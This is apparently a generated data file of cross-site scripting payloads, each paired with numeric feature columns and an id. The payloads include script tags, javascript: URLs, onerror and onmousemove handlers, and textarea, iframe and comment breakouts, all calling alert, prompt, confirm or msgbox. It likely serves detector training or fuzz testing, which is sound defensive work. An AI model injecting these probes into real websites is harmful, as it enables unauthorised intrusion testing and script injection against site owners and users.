0,0,1,0,0,1,1,1,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,0,0,0,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,0,0,0,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,1,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,1,1,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,1,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,1,1,0,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,0,1,0,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,1,0,1,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,1,1,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,1,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,1,1,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,1,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,1,0,0,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,1,1,0,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,0,1,0,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,0,1,1,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,1,0,1,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,1,1,1,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,1,0,0,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,1,1,0,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,0,1,0,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,1,0,1,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,1,0,0,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,1,1,0,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,0,1,0,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,0,1,1,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,0,0,1,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,1,0,1,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,1,1,1,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,1,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,1,1,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,1,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,1,1,0,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,1,0,1,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,1,1,1,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,1,1,1,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,1,0,0,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,1,1,0,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,1,0,1,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,1,1,1,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,0,1,1,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,1,1,0,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,1,0,1,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,1,1,1,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,1,1,1,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,1,0,0,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,1,1,0,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,1,0,1,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,1,1,1,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,0,1,1,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,1,1,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,1,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,1,1,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,1,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,1,1,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,1,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,112,"[""><script>alert``;</script>]"
7,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,0,1,0,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,0,1,1,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,1,0,1,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,113,[</textarea><img src=x onerror=alert();>]
7,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,1,0,0,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,1,1,0,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,0,1,1,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,1,0,1,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,1,1,1,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,114,[</textarea><img src=x onerror=prompt();>]
7,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,1,0,0,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,1,1,0,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,0,1,0,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,0,1,1,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,0,0,1,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,1,0,1,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,1,1,1,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,115,[</textarea><img src=x onerror=confirm();>]
7,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,1,0,0,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,1,1,0,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,0,1,0,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,0,1,1,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,0,0,1,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,1,0,1,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,1,1,1,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
7,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,116,[</textarea><img src=x onerror=alert``;>]
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,117,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,1,1,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,118,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,1,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,1,1,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
